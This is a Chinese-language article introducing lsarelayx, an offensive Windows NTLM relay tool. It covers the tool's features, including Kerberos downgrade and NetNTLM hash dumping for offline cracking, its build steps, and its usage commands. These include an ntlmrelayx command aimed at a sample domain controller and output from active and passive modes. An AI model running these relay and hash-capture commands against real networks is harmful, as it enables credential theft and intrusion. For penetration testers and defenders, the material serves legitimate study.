![](https://image.3001.net/images/20220120/1642610060_61e83d8c68eb7a88727a0.png!small)

## 关于lsarelayx

lsarelayx是一个系统范围的NTLM中继工具，主要用于中继目标主机中基于NTLM的认证传入连接。lsarelayx将会中继任何包含了SMB的传入认证请求。由于lsarelayx可以挂钩现有的应用程序身份验证流，因此该工具还将尝试在中继完成后为原始身份验证请求提供服务。这种模式可以防止目标应用程序/协议显示错误，并使终端用户通过lsarelayx主机进行身份验证时能够正常工作。

## 功能介绍

> 1、在系统范围内中继NTLM连接，包括SMB、HTTP/HTTPS、LDAP/LDAPS或实现Windows身份验证API的任何其他第三方应用程序。
>
> 2、在可能的情况下，将传入的Kerberos身份验证请求降级为NTLM。这将导致尝试传统Kerberos身份验证的客户端退回到NTLM。
>
> 3、对中继用户执行LDAP查询，以获取组成员信息并为原始请求创建正确的身份验证令牌。
>
> 4、转储NetNTLM消息以进行脱机破解。
>
> 5、支持被动模式，无中继切仅转储捕获的NetNTLM哈希（此模式下无Kerberos降级）。

## 工具下载

广大研究人员可以使用下列命令将该项目源码克隆至本地：

    
    
    git clone https://github.com/CCob/lsarelayx.git

## 工具构建

### Docker

如果你安装了Docker，那么通过Docker来使用lsarelayx就非常方便了，因为它可以使用ccob/windows_cross镜像来进行项目构建，而ccob/windows_cross镜像已经预安装了所有的依赖组件。

### Docker（Windows Powershell）

    
    
    docker run --rm -it -v $env:pwd\:/root/lsarelayx ccob/windows_cross:latest /bin/bash -c "cd /root/lsarelayx; mkdir build; cd build; cmake -DCMAKE_INSTALL_PREFIX=/root/lsarelayx/dist -DCMAKE_BUILD_TYPE=MinSizeRel -DCMAKE_TOOLCHAIN_FILE=../toolchain/Linux-mingw64.cmake ..; --build . --target install/strip"

### Docker（Linux）

    
    
    docker run --rm -it -v $(pwd):/root/lsarelayx ccob/windows_cross:latest /bin/bash -c "cd /root/lsarelayx; mkdir build; cd build; cmake -DCMAKE_INSTALL_PREFIX=/root/lsarelayx/dist -DCMAKE_BUILD_TYPE=MinSizeRel -DCMAKE_TOOLCHAIN_FILE=../toolchain/Linux-mingw64.cmake ..; cmake --build . --target install/strip"

### Linux

在Linux系统下，我们可以使用一个CMake工具链和MinGW编译器来实现项目构建，这里将需要使用到dotnet命令行工具：

    
    
    mkdir build
    
    cd build
    
    cmake -DCMAKE_INSTALL_PREFIX=$PWD/dist -DCMAKE_BUILD_TYPE=MinSizeRel -DCMAKE_TOOLCHAIN_FILE=../toolchain/Linux-mingw64.cmake ..
    
    cmake --build . --target install/strip

### Windows（Powershell）

Windows系统下将需要安装好完整的CMake、MinGW和Visual Studio，这种构建方式相对来说比较麻烦，而且需要预先配置好开发环境：

    
    
    mkdir build
    
    cd build
    
    cmake -DCMAKE_INSTALL_PREFIX=$PWD/dist -DCMAKE_BUILD_TYPE=MinSizeRel -G "MinGW Makefiles" ..
    
    cmake --build . --target install/strip

## 工具使用

### 主动模式

首先，我们需要启动ntmlrelayx服务器模块来监听经过lsarelayx的原始NTLM消息：

    
    
    python examples\ntlmrelayx.py -smb2support --no-wcf-server --no-smb-server --no-http-server "-t" smb://dc.victim.lan
    
     
    
    Impacket v0.9.24.dev1+20211015.125134.c0ec6102 - Copyright 2021 SecureAuth Corporation
    
     
    
    [*] Protocol Client DCSYNC loaded..
    
    [*] Protocol Client HTTPS loaded..
    
    [*] Protocol Client HTTP loaded..
    
    [*] Protocol Client IMAP loaded..
    
    [*] Protocol Client IMAPS loaded..
    
    [*] Protocol Client LDAP loaded..
    
    [*] Protocol Client LDAPS loaded..
    
    [*] Protocol Client MSSQL loaded..
    
    [*] Protocol Client RPC loaded..
    
    [*] Protocol Client SMB loaded..
    
    [*] Protocol Client SMTP loaded..
    
    [*] Running in relay mode to single host
    
    [*] Setting up RAW Server on port 6666
    
     
    
    [*] Servers started, waiting for connections

lsarelayx的运行需要本地管理员权限，为了以主动中继模式运行，还需要给ntlmrelayx服务器模块指定主机地址。默认端口号为6666，我们也可以使用“--port”参数来指定端口，但同时也需要使用“--raw-port”参数来重写ntlmrelayx端的端口：

    
    
    lsarelayx.exe --host 192.168.1.1
    
    [+] Using 192.168.1.1:6666 for relaying NTLM connections
    
    [=] Attempting to load LSA plugin C:\users\Administrator\Desktop\liblsarelayx.dll

### 被动模式

我们还可以选择以被动模式运行lsarelayx，直接运行lsarelayx无需提供任何参数即可：

    
    
    lsarelayx.exe
    
    [=] No host supplied, switching to passive mode
    
    [=] Attempting to load LSA plugin C:\users\Administrator\Desktop\liblsarelayx.dll

## 项目地址

 **lsarelayx：** 【[ _GitHub传送门_](https://github.com/CCob/lsarelayx)】

## 参考资料

> [
> _https://github.com/SecureAuthCorp/impacket/pull/1190_](https://github.com/SecureAuthCorp/impacket/pull/1190)
>
> [ _https://github.com/CCob/impacket﻿_](https://github.com/CCob/impacket)

